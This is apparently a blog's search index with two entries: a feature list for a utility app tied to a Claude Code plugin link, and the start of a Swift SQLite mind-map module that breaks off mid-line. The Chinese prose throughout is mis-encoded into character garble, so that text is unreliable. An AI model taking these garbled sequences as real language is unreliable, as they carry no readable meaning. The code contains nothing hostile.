<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ccplugin</title>
    <link href="/2025/11/19/ccplugin/"/>
    <url>/2025/11/19/ccplugin/</url>
    
    <content type="html"><![CDATA[<p>ä¸€ä¸ªå¥½ç”¨çš„ccæ’ä»¶</p><p><a href="https://github.com/seth-schultz/orchestr8.git">orchest8</a></p><ol><li>æ–‡ä»¶ &amp; æ–‡æ¡£ç±»å·¥å…·ï¼ˆé«˜é¢‘ï¼‰<br>1.1 æ–‡ä»¶è½¬æ¢å™¨</li></ol><p>PDF â‡† å›¾ç‰‡ï¼ˆJPG/PNGï¼‰</p><p>PDF åˆå¹¶/æ‹†åˆ†</p><p>Word / Excel / PPT â†” PDF</p><p>å›¾ç‰‡æ ¼å¼è½¬æ¢ï¼šHEIC â‡† JPGã€PNG</p><p>1.2 PDF å·¥å…·</p><p>PDF ç­¾å</p><p>PDF å‹ç¼©</p><p>å¡«å†™ PDF è¡¨å•</p><p>OCRï¼ˆæ‰«ææ–‡å­—è¯†åˆ«ï¼‰</p><p>1.3 æ‰«æä»ªå·¥å…·</p><p>æ–‡æ¡£æ‰«æï¼ˆè‡ªåŠ¨è£è¾¹ + æå‡å¯¹æ¯”åº¦ï¼‰</p><p>æ‰«æç”Ÿæˆ PDF</p><p>OCR è¯†åˆ«æ–‡å­—ï¼ˆå¤šè¯­è¨€ï¼‰</p><ol start="2"><li>è®¡ç®— &amp; ç”Ÿæ´»ç±»å·¥å…·ï¼ˆå¸¸ç”¨è½»é‡å·¥å…·ï¼‰<br>2.1 è®¡ç®—å™¨æ‰©å±•</li></ol><p>ç§‘å­¦è®¡ç®—å™¨</p><p>ç¨è´¹è®¡ç®—</p><p>æˆ¿è´·è®¡ç®—</p><p>æ±‡ç‡è½¬æ¢</p><p>2.2 å•ä½æ¢ç®—</p><p>é•¿åº¦ã€é‡é‡ã€é¢ç§¯ã€ä½“ç§¯</p><p>æ¸©åº¦</p><p>é€Ÿåº¦</p><p>æ•°æ®å­˜å‚¨å•ä½ï¼ˆMB/GB/GiBï¼‰</p><p>æ—¶é—´è½¬æ¢ï¼ˆå¦‚æ¯«ç§’ â†’ æ—¥æœŸï¼‰</p><p>2.3 ç”Ÿæ´»ç±»å°å·¥å…·</p><p>å¤©æ°”æŸ¥è¯¢ï¼ˆå®šä½ + å¤šåŸå¸‚ï¼‰</p><p>å€’è®¡æ—¶/è®¡æ—¶å™¨</p><p>ä¸–ç•Œæ—¶é’Ÿ</p><p>é‡è¦æ—¥å­ï¼ˆD-dayï¼‰</p><ol start="3"><li>ç³»ç»Ÿä¿¡æ¯å·¥å…·<br>3.1 ç½‘ç»œå·¥å…·</li></ol><p>ç½‘ç»œæµ‹é€Ÿï¼ˆä¸‹è½½/ä¸Šä¼ /å»¶è¿Ÿï¼‰</p><p>å±€åŸŸç½‘è®¾å¤‡æ‰«æ</p><p>Ping / Traceroute</p><p>IP æŸ¥è¯¢ï¼ˆå†…/å¤–ç½‘ï¼‰</p><p>3.2 æ‰‹æœºç¡¬ä»¶æ£€æµ‹</p><p>ç”µæ± å¥åº·ï¼ˆCycle countã€æ¸©åº¦ï¼ŒiOS å¯å—é™åˆ¶ï¼‰</p><p>CPU/GPU å‹åŠ›æµ‹è¯•ï¼ˆè½»åº¦ï¼‰</p><p>å­˜å‚¨ç©ºé—´åˆ†æ</p><p>ä¼ æ„Ÿå™¨æ£€æµ‹ï¼ˆé™€èºä»ªã€åŠ é€Ÿåº¦è®¡ç­‰ï¼‰</p><ol start="4"><li>ä¾¿åˆ©å·¥å…·ï¼ˆç”¨æˆ·å¾ˆå¸¸ç”¨ï¼‰<br>4.1 å‰ªè´´æ¿å¢å¼ºåŠŸèƒ½</li></ol><p>å‰ªè´´æ¿å†å²</p><p>æ–‡æœ¬å¿«é€Ÿæ ¼å¼åŒ–ï¼ˆå¤§å†™ã€å°å†™ã€é¦–å­—æ¯å¤§å†™ï¼‰</p><p>JSON/SQL/XML æ ¼å¼åŒ– &amp; é«˜äº®</p><p>4.2 æ–‡æœ¬å·¥å…·</p><p>æ–‡å­—è®¡æ•°å™¨ï¼ˆå­—æ•°ã€è¯æ•°ã€é˜…è¯»æ—¶é—´ï¼‰</p><p>æ–‡æœ¬å·®å¼‚å¯¹æ¯”ï¼ˆdiffï¼‰</p><p>Markdown é¢„è§ˆ/è½¬æ–‡ä»¶</p><p>Base64 ç¼–ç /è§£ç </p><p>4.3 å›¾åƒå·¥å…·</p><p>å›¾ç‰‡å‹ç¼©</p><p>å›¾ç‰‡è£å‰ª/åŠ æ°´å°</p><p>å›¾ç‰‡ exif æŸ¥çœ‹/å»é™¤</p><p>ä¹å®«æ ¼åˆ‡å›¾</p><ol start="5"><li>å¼€å‘è€…/è¿›é˜¶ç”¨æˆ·å·¥å…·ï¼ˆå¦‚æœé¢å‘ä¸“ä¸šç”¨æˆ·ï¼Œå¯ä»¥åŠ ï¼‰<br>5.1 ç½‘ç»œè°ƒè¯•å·¥å…·</li></ol><p>è¯·æ±‚æ„å»ºå·¥å…·ï¼ˆç±»ä¼¼ Postmanï¼‰</p><p>WebSocket æµ‹è¯•</p><p>URL ç¼–ç /è§£ç </p><p>5.2 æ­£åˆ™è¡¨è¾¾å¼å·¥å…·</p><p>åŒ¹é…æµ‹è¯•</p><p>ä»£ç é«˜äº®</p><p>å¸¸ç”¨æ­£åˆ™åº“</p><p>5.3 ä»£ç ç‰‡æ®µå·¥å…·</p><p>JSON/YAML æ ¼å¼åŒ–</p><p>UUID ç”Ÿæˆ</p><p>Timestamp â†” æ—¥æœŸ</p><ol start="6"><li>è´¦å·ä¸å®‰å…¨å·¥å…·ï¼ˆè¶Šæ¥è¶Šå¤šäººéœ€è¦ï¼‰<br>6.1 å¯†ç å·¥å…·</li></ol><p>éšæœºå¯†ç ç”Ÿæˆ</p><p>å¯†ç å¼ºåº¦æ£€æµ‹</p><p>å®‰å…¨ä¾¿ç­¾ï¼ˆæœ¬åœ°åŠ å¯†ï¼‰</p><p>6.2 åŠ å¯†å·¥å…·</p><p>AES åŠ å¯†/è§£å¯†</p><p>å“ˆå¸Œè®¡ç®—ï¼ˆMD5/SHA ç³»åˆ—ï¼‰</p><p>æ–‡ä»¶æ ¡éªŒï¼ˆChecksumï¼‰</p><ol start="7"><li>AI è¾…åŠ©å·¥å…·ï¼ˆ2025å¹´å¿…å¤‡ï¼‰<br>7.1 åŸºç¡€ AI å·¥å…·</li></ol><p>æ–‡æœ¬æ€»ç»“</p><p>ç¿»è¯‘</p><p>å›¾åƒè¯†åˆ«ï¼ˆOCR + æè¿°ï¼‰</p><p>èŠå¤©åŠ©æ‰‹ï¼ˆå¦‚æœ¬åœ°çš„ç¦»çº¿æ¨¡å‹æˆ–åœ¨çº¿ AIï¼‰</p><p>7.2 AI æ–‡ä»¶å¤„ç†</p><p>PDF AI è§£è¯»</p><p>å¤šè¯­è¨€ OCR + ç¿»è¯‘</p><p>æ ¹æ®å›¾åƒç”Ÿæˆ Markdown æ–‡æ¡£</p><p>ğŸ”¥ æ¨èç»„åˆï¼šæœ€å—æ¬¢è¿çš„10ä¸ªå·¥å…·ï¼ˆé€‚åˆ MVPï¼‰</p><p>å¦‚æœä½ è¦å…ˆåšä¸€ä¸ª é«˜ä½¿ç”¨ç‡çš„ MVPï¼Œæˆ‘å»ºè®®åŒ…å«ä»¥ä¸‹åŠŸèƒ½ï¼š</p><p>æ–‡æ¡£æ‰«æ + OCR</p><p>PDF åŠŸèƒ½åˆé›†</p><p>å›¾ç‰‡å‹ç¼©/æ ¼å¼è½¬æ¢</p><p>æ–‡ä»¶è½¬æ¢ï¼ˆPDF â†” Word/Excel/PPTï¼‰</p><p>è®¡ç®—å™¨å¢å¼º + å•ä½æ¢ç®—</p><p>å‰ªè´´æ¿å·¥å…·</p><p>æ–‡æœ¬æ ¼å¼åŒ–/JSON Formatter</p><p>ç½‘ç»œæµ‹é€Ÿ + IP æŸ¥è¯¢</p><p>å¯†ç ç”Ÿæˆå™¨</p><p>AI æ–‡æœ¬æ€»ç»“ + ç¿»è¯‘</p>]]></content>
    
    
    <categories>
      
      <category>Project,AI,</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Claude, Tool,</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ€ç»´å¯¼å›¾æ•°æ®ç»“æ„</title>
    <link href="/2025/11/13/mindmapdata/"/>
    <url>/2025/11/13/mindmapdata/</url>
    
    <content type="html"><![CDATA[<p>ä¸€ä¸ªç®€å•çš„æ€ç»´å¯¼å›¾æ•°æ®ç»“æ„ä¾‹å­</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br></pre></td><td class="code"><pre><code class="hljs swift"><br><span class="hljs-comment">// SQLiteMindMapFull.swift</span><br><span class="hljs-comment">// Swift 6 async/await + Combine + Hierarchical Drag &amp; Drop</span><br><span class="hljs-comment">// Single-file SQLite-backed mind map module for iOS/macOS (Swift 6)</span><br><br><span class="hljs-keyword">import</span> Foundation<br><span class="hljs-keyword">import</span> Combine<br><span class="hljs-keyword">import</span> SQLite3<br><span class="hljs-keyword">import</span> UniformTypeIdentifiers<br><span class="hljs-keyword">import</span> SwiftUI<br><br><span class="hljs-comment">// MARK: - Models</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">MindMapNode</span>: <span class="hljs-title class_ inherited__">Identifiable</span>, <span class="hljs-title class_ inherited__">Codable</span>, <span class="hljs-title class_ inherited__">Sendable</span>, <span class="hljs-title class_ inherited__">Equatable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> id: <span class="hljs-type">String</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> parentId: <span class="hljs-type">String</span>?<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> title: <span class="hljs-type">String</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> content: <span class="hljs-type">String</span>?<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> position: <span class="hljs-type">Int</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> color: <span class="hljs-type">String</span>?<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> createdAt: <span class="hljs-type">Date</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> updatedAt: <span class="hljs-type">Date</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">id</span>: <span class="hljs-type">String</span> <span class="hljs-operator">=</span> <span class="hljs-type">UUID</span>().uuidString,<br>                <span class="hljs-params">parentId</span>: <span class="hljs-type">String</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>,<br>                <span class="hljs-params">title</span>: <span class="hljs-type">String</span>,<br>                <span class="hljs-params">content</span>: <span class="hljs-type">String</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>,<br>                <span class="hljs-params">position</span>: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>                <span class="hljs-params">color</span>: <span class="hljs-type">String</span>? <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>,<br>                <span class="hljs-params">createdAt</span>: <span class="hljs-type">Date</span> <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>(),<br>                <span class="hljs-params">updatedAt</span>: <span class="hljs-type">Date</span> <span class="hljs-operator">=</span> <span class="hljs-type">Date</span>()) &#123;<br>        <span class="hljs-keyword">self</span>.id <span class="hljs-operator">=</span> id<br>        <span class="hljs-keyword">self</span>.parentId <span class="hljs-operator">=</span> parentId<br>        <span class="hljs-keyword">self</span>.title <span class="hljs-operator">=</span> title<br>        <span class="hljs-keyword">self</span>.content <span class="hljs-operator">=</span> content<br>        <span class="hljs-keyword">self</span>.position <span class="hljs-operator">=</span> position<br>        <span class="hljs-keyword">self</span>.color <span class="hljs-operator">=</span> color<br>        <span class="hljs-keyword">self</span>.createdAt <span class="hljs-operator">=</span> createdAt<br>        <span class="hljs-keyword">self</span>.updatedAt <span class="hljs-operator">=</span> updatedAt<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">MindMapTree</span>: <span class="hljs-title class_ inherited__">Identifiable</span>, <span class="hljs-title class_ inherited__">Codable</span>, <span class="hljs-title class_ inherited__">Equatable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">let</span> id: <span class="hljs-type">String</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> node: <span class="hljs-type">MindMapNode</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> children: [<span class="hljs-type">MindMapTree</span>]<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">init</span>(<span class="hljs-params">id</span>: <span class="hljs-type">String</span>, <span class="hljs-params">node</span>: <span class="hljs-type">MindMapNode</span>, <span class="hljs-params">children</span>: [<span class="hljs-type">MindMapTree</span>] <span class="hljs-operator">=</span> []) &#123;<br>        <span class="hljs-keyword">self</span>.id <span class="hljs-operator">=</span> id<br>        <span class="hljs-keyword">self</span>.node <span class="hljs-operator">=</span> node<br>        <span class="hljs-keyword">self</span>.children <span class="hljs-operator">=</span> children<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// MARK: - Errors</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">DatabaseError</span>: <span class="hljs-title class_ inherited__">Error</span>, <span class="hljs-title class_ inherited__">CustomStringConvertible</span> &#123;<br>    <span class="hljs-keyword">case</span> openFailed(message: <span class="hljs-type">String</span>?)<br>    <span class="hljs-keyword">case</span> prepareFailed(message: <span class="hljs-type">String</span>?)<br>    <span class="hljs-keyword">case</span> insertFailed(message: <span class="hljs-type">String</span>?)<br>    <span class="hljs-keyword">case</span> deleteFailed(message: <span class="hljs-type">String</span>?)<br>    <span class="hljs-keyword">case</span> queryFailed(message: <span class="hljs-type">String</span>?)<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">var</span> description: <span class="hljs-type">String</span> &#123;<br>        <span class="hljs-keyword">switch</span> <span class="hljs-keyword">self</span> &#123;<br>        <span class="hljs-keyword">case</span> .openFailed(<span class="hljs-keyword">let</span> msg): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Open failed: <span class="hljs-subst">\(msg <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span>)</span>&quot;</span><br>        <span class="hljs-keyword">case</span> .prepareFailed(<span class="hljs-keyword">let</span> msg): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Prepare failed: <span class="hljs-subst">\(msg <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span>)</span>&quot;</span><br>        <span class="hljs-keyword">case</span> .insertFailed(<span class="hljs-keyword">let</span> msg): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Insert failed: <span class="hljs-subst">\(msg <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span>)</span>&quot;</span><br>        <span class="hljs-keyword">case</span> .deleteFailed(<span class="hljs-keyword">let</span> msg): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Delete failed: <span class="hljs-subst">\(msg <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span>)</span>&quot;</span><br>        <span class="hljs-keyword">case</span> .queryFailed(<span class="hljs-keyword">let</span> msg): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Query failed: <span class="hljs-subst">\(msg <span class="hljs-operator">??</span> <span class="hljs-string">&quot;&quot;</span>)</span>&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">let</span> <span 